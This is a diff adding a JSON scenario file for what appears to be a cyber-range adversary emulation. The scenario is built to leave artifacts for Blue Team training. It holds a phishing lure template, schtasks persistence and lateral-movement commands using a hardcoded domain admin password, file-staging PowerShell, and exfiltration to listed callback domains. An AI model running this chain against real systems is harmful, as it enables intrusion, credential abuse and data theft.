@@ -1,0 +1,849 @@
+{
+    "meta_data": {
+        "name": "host_based_artifacts",
+        "version": "v1.0.2",
+        "title": "Host-Based Artifact Dropper with Multiple File Exfiltration",
+        "description": "Attempts to gain access to a lateral host, potentially on a different subnet. Achieves persistence on the initial access host in two ways and the lateral host in one way. Exfiltrates data from the lateral host through two different channels and intentionally leaves behind a variety of artifacts for Blue Team detection and forensic analysis.",
+        "author": "Attack Content",
+        "suggested_duration": 2020
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "SpearPhishingLink",
+            "technique": "InitialAccess",
+            "label": "spearPhishingLink",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "tune": {
+                    "body": {
+                        "template": [
+                            "Hi, \nThe 2019 Senior Staff Club House calendar gallery has been updated. To submit artwork for consideration, please fill in the form at http://",
+                            "self.driveby_domain",
+                            "/",
+                            "self.payload_name",
+                            " .\n The deadline for submission is May 17, 2019. \nThanks and look forward to seeing your beautiful projects! \nKelly"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "tune": {
+                    "infra": true
+                }
+            }
+        },
+        {
+            "tactic": "ValidAccounts_LocalAccounts",
+            "technique": "PrivilegeEscalation",
+            "label": "validAccounts_LocalAccounts_t1",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target_1": "self.target_1",
+                "target_2": "self.target_1_elevated"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_2",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1_elevated"
+            }
+        },
+        {
+            "tactic": "ScheduledTaskPersistence",
+            "technique": "Persistence",
+            "label": "scheduled_task_1",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "schtasks /create /f /tn ",
+                            "self.target_1_elevated_taskname",
+                            " /tr ",
+                            "self.target_1_elevated_payload_destination",
+                            "\\",
+                            "self.payload_name",
+                            " /sc onlogon"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "RegistryRunKeysStartupFolder",
+            "technique": "Persistence",
+            "label": "Startup_Folder_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated"
+            }
+        },
+        {
+            "tactic": "SystemOwnerUserDiscovery",
+            "technique": "Discovery",
+            "label": "systemOwnerUserDiscovery_t1_elevated",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated",
+                "tune": {
+                    "command": "net user"
+                }
+            }
+        },
+        {
+            "tactic": "RemoteSystemDiscovery",
+            "technique": "Discovery",
+            "label": "remoteSystemDiscovery_t1_elevated",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated",
+                "tune": {
+                    "command": "net view /all"
+                }
+            }
+        },
+        {
+            "tactic": "DomainAccount",
+            "technique": "Discovery",
+            "label": "domainAccount_t1_elevated",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated",
+                "tune": {
+                    "command": "net user /domain"
+                }
+            }
+        },
+        {
+            "tactic": "DomainAccount",
+            "technique": "Discovery",
+            "label": "domainGroups_t1_elevated",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated",
+                "tune": {
+                    "command": "net group /domain"
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConnectionsDiscovery",
+            "technique": "Discovery",
+            "label": "systemNetworkConnectionsDiscovery_t1_elevated",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated",
+                "tune": {
+                    "command": "netstat -ano"
+                }
+            }
+        },
+        {
+            "tactic": "ScheduledTask",
+            "technique": "LateralMovement",
+            "label": "scheduled_task_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target_1": "self.target_1_elevated",
+                "target_2": "self.target_2",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{schtasks /create /f /tn \"",
+                            "self.target_2_taskname",
+                            "\" /ST 23:58 /sc once /tr cmd.exe /ru ",
+                            "self.target_1_elevated_username",
+                            " /rp ",
+                            "self.target_1_elevated_password",
+                            "; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\",
+                            "self.target_2_hostname",
+                            " /user:",
+                            "self.target_2_username",
+                            "@",
+                            "self.domain",
+                            " ",
+                            "self.target_2_password",
+                            "\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"c:\\users\\public\\ \\\\",
+                            "self.target_2_hostname",
+                            "\\c$\\users\\public ",
+                            "self.payload_name",
+                            "\"; $trigger = New-ScheduledTaskTrigger -once -at 23:59; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"",
+                            "self.target_2_taskname",
+                            "\" -user ",
+                            "self.target_1_elevated_username",
+                            " -password ",
+                            "self.target_1_elevated_password",
+                            " }"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ScheduledTaskExecution",
+            "technique": "Execution",
+            "label": "scheduled_task_execution_1",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target_1": "self.target_1_elevated",
+                "target_2": "self.target_2",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "schtasks /run /tn ",
+                            "self.target_2_taskname"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ScheduledTask",
+            "technique": "LateralMovement",
+            "label": "scheduled_task_3",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target_1": "self.target_1_elevated",
+                "target_2": "self.target_2",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN ",
+                            "self.target_2_taskname",
+                            " /TR c:\\users\\public\\",
+                            "self.payload_name",
+                            " /RL highest /u ",
+                            "self.target_2_username",
+                            "@",
+                            "self.domain",
+                            " /p ",
+                            "self.target_2_password",
+                            " /ru ",
+                            "self.target_2_username",
+                            "@",
+                            "self.domain",
+                            " /rp ",
+                            "self.target_2_password",
+                            " /s ",
+                            "self.target_2_hostname"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ScheduledTaskExecution",
+            "technique": "Execution",
+            "label": "scheduled_task_execution_2",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target_1": "self.target_1_elevated",
+                "target_2": "self.target_2"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_3",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_2"
+            }
+        },
+        {
+            "tactic": "TaintSharedContent",
+            "technique": "LateralMovement",
+            "label": "taintSharedContent_t2",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target_1": "self.target_2",
+                "target_2": "self.target_2",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "robocopy c:\\users\\public\\ \\\\file\\share ",
+                            "self.payload_name"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ScheduledTask",
+            "technique": "LateralMovement",
+            "label": "scheduled_task_4",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target_1": "self.target_2",
+                "target_2": "self.target_2",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{schtasks /create /f /tn \"",
+                            "self.target_2_taskname",
+                            "\" /sc onlogon /tr cmd.exe; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\file\\share /user:",
+                            "self.target_2_username",
+                            "@",
+                            "self.domain",
+                            " ",
+                            "self.target_2_password",
+                            "\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"\\\\file\\share c:\\users\\public ",
+                            "self.payload_name",
+                            "\"; $trigger = New-ScheduledTaskTrigger -AtLogOn; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"",
+                            "self.target_2_taskname",
+                            "\" }"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "LocalDataStaging",
+            "technique": "Collection",
+            "label": "localDataStaging_t2_1",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target": "self.target_2",
+                "tune": {
+                    "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Copy-Item -Path $file C:\\users\\public\\secret1.file -force; echo $file}"
+                }
+            }
+        },
+        {
+            "tactic": "LocalDataStaging",
+            "technique": "Collection",
+            "label": "localDataStaging_t2_2",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target": "self.target_2",
+                "tune": {
+                    "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Copy-Item -Path $file C:\\users\\public\\secret2.file -force; echo $file}"
+                }
+            }
+        },
+        {
+            "tactic": "ExfiltrationOverWebService",
+            "technique": "Exfiltration",
+            "label": "exfiltrationOverWebService_t2_1",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "target": "self.target_2"
+            }
+        },
+        {
+            "tactic": "ExfiltrationOverWebService",
+            "technique": "Exfiltration",
+            "label": "exfiltrationOverWebService_t2",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target": "self.target_2",
+                "exfil": "self.exfil"
+            }
+        },
+        {
+            "tactic": "ExfiltrationOverWebService",
+            "technique": "Exfiltration",
+            "label": "exfiltrationOverWebService_t1_elevated",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated",
+                "exfil": "self.exfil"
+            }
+        },
+        {
+            "tactic": "ExfiltrationOverWebService",
+            "technique": "Exfiltration",
+            "label": "exfiltrationOverWebService_t1_1_elevated",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated",
+                "exfil": "self.exfil"
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target": "self.target_2"
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated"
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": [
+            "archaeology.us",
+            "archaeology.org",
+            "archaeology.net",
+            "dinosaurs.bones.com",
+            "civilizations.com",
+            "ancient.ruins.com",
+            "remnants.com",
+            "leftovers.org",
+            "digsites.org",
+            "ancient.cities.org"
+        ],
+        "ip": [
+            "52.129.23.153/24",
+            "64.62.178.187/24",
+            "216.250.121.27/24",
+            "52.43.227.193/24",
+            "195.149.94.100/24",
+            "68.178.247.86/24",
+            "104.247.81.53/24",
+            "199.59.243.200/24",
+            "15.197.142.173/24",
+            "15.197.144.173/24"
+        ],
+        "binary": [
+            "mixed_client.doc.exe",
+            "ctmp.exe",
+            "dtmp.exe",
+            "calc.exe",
+            "word.exe",
+            "doc.exe",
+            "txt.exe",
+            "etmp.exe",
+            "ftmp.exe",
+            "gtmp.exe"
+        ],
+        "taskname": [
+            {
+                "template": [
+                    "windowsUpdater",
+                    {
+                        "kind": "call",
+                        "func": {
+                            "kind": "name",
+                            "id": "randint"
+                        },
+                        "args": [
+                            1,
+                            200
+                        ]
+                    }
+                ]
+            }
+        ]
+    },
+    "spec": {
+        "emaillist": "@('Janice Durham <janice.durham@site.com>', 'Darryl Richmond <darryl.richmond@site.com>', 'Nelda Rios <nelda.rios@site.com>', 'Joanna Wilkerson <joanna.wilkerson@site.com>')",
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "54",
+                "jitter": "10",
+                "ioc-ip_callback": "122.49.200.108/24",
+                "ioc-domain_callback": "inf0rm.bed1rcati.com",
+                "ioc-binary_payload_name": "mixed_client.doc.exe"
+            }
+        },
+        "phishing": {
+            "1": {
+                "ioc-server_addr": "200.200.200.201",
+                "from_addr": "Caroline@winemixer.com",
+                "to_addrs": "Madelyn.Luna@site.com",
+                "cc": "",
+                "bcc": "",
+                "subject": "Updated Gallery for 2020 Mixed Client Submissions",
+                "body_subtype": "plain",
+                "attach": "",
+                "username": "Caroline",
+                "password": "",
+                "port": "25"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "161.135.1.25/24",
+                "ioc-domain_exfil": "deepwaterhorizon.com"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "161.135.1.22/24",
+                "ioc-domain_driveby": "texaspumps.us"
+            }
+        },
+        "targets": {
+            "1": {
+                "query-target_control_ip": "10.10.5.101",
+                "query-target_ip": "172.16.5.101",
+                "query-target_hostname": "dev-win10-1",
+                "payload_destination": "c:\\users\\Public",
+                "ioc-taskname": {
+                    "template": [
+                        {
+                            "kind": "name",
+                            "id": "scenario_name"
+                        },
+                        "_",
+                        {
+                            "kind": "call",
+                            "func": {
+                                "kind": "name",
+                                "id": "time"
+                            },
+                            "args": []
+                        }
+                    ]
+                },
+                "persistence_directory": "C:\\Users\\%Username%\\AppData\\Roaming\\Microsoft\\Windows\\STARTM~1\\Programs\\Startup",
+                "query-target_username": "",
+                "query-target_password": "",
+                "query-target_email": "Madelyn.Luna@site.com",
+                "query-domain_admin_username": "administrator",
+                "query-domain_admin_password": "Simspace1!Simspace1!"
+            },
+            "2": {
+                "query-target_ip": "172.16.6.101",
+                "query-target_hostname": "acc-win10-1",
+                "query-exfil_files": [
+                    "C:\\users\\public\\secret1.file",
+                    "C:\\users\\public\\secret2.file"
+                ],
+                "payload_destination": "C:\\users\\public",
+                "ioc-taskname": {
+                    "template": [
+                        {
+                            "kind": "name",
+                            "id": "scenario_name"
+                        },
+                        "_",
+                        {
+                            "kind": "call",
+                            "func": {
+                                "kind": "name",
+                                "id": "time"
+                            },
+                            "args": []
+                        }
+                    ]
+                },
+                "query-target_username": "",
+                "query-target_password": "",
+                "query-domain_admin_username": "administrator",
+                "query-domain_admin_password": "Simspace1!Simspace1!"
+            }
+        }
+    },
+    "preconditions": {
+        "state": {},
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "phish_1": {
+                "path": [
+                    "phishing",
+                    "1"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "target_1_elevated": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "target_1_elevated_payload_destination": {
+                "path": [
+                    "targets",
+                    "1",
+                    "payload_destination"
+                ]
+            },
+            "target_1_elevated_taskname": {
+                "path": [
+                    "targets",
+                    "1",
+                    "ioc-taskname"
+                ]
+            },
+            "target_1_elevated_username": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-domain_admin_username"
+                ]
+            },
+            "target_1_elevated_password": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-domain_admin_password"
+                ]
+            },
+            "target_2": {
+                "path": [
+                    "targets",
+                    "2"
+                ]
+            },
+            "target_2_username": {
+                "path": [
+                    "targets",
+                    "2",
+                    "query-domain_admin_username"
+                ]
+            },
+            "target_2_password": {
+                "path": [
+                    "targets",
+                    "2",
+                    "query-domain_admin_password"
+                ]
+            },
+            "target_2_hostname": {
+                "path": [
+                    "targets",
+                    "2",
+                    "query-target_hostname"
+                ]
+            },
+            "target_2_taskname": {
+                "path": [
+                    "targets",
+                    "2",
+                    "ioc-taskname"
+                ]
+            },
+            "domain": {
+                "path": [
+                    "targets",
+                    "2",
+                    "query-target_domain"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            },
+            "agent_tgt1_elevated": {
+                "path": [
+                    "webProtocols_2",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            },
+            "agent_tgt2": {
+                "path": [
+                    "webProtocols_3",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
